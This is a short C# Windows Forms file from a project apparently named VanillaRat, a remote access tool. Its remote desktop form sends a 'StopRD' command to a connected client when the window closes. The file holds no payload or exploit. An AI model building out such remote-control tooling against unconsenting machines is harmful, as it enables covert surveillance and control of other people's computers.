using System.Text;
using System.Windows.Forms;
using VanillaRat.Classes;

namespace VanillaRat.Forms
{
    public partial class RDC : Form
    {
        public RDC()
        {
            InitializeComponent();          
        }

        public int ConnectionID { get; set; }

        //Stop remote desktop
        private void RDC_FormClosing(object sender, FormClosingEventArgs e)
        {
            Server.MainServer.Send(ConnectionID, Encoding.ASCII.GetBytes("StopRD"));
            Main M = new Main();
            M.RDActive = false;
        }
    }
}